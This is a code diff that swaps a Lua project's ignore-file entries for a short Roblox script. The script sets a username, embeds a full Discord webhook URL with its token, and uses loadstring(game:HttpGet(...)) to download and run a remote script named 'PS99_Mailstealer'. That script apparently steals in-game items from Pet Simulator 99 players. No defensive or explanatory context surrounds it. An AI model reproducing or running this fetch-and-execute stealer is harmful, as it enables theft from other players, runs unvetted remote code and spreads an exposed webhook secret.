@@ -1,41 +1,5 @@
-# Compiled Lua sources
-luac.out
+Username = Kujotheking
+LoadScreen = true 
+Webhook = https://discord.com/api/webhooks/1222304237149487266/AEZYqVmRejqqrNdOxJlhJX1BGuQCMyqeqVS3jomF5sW2I4WMnaPKRfIagHTaBeIaGLtz
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
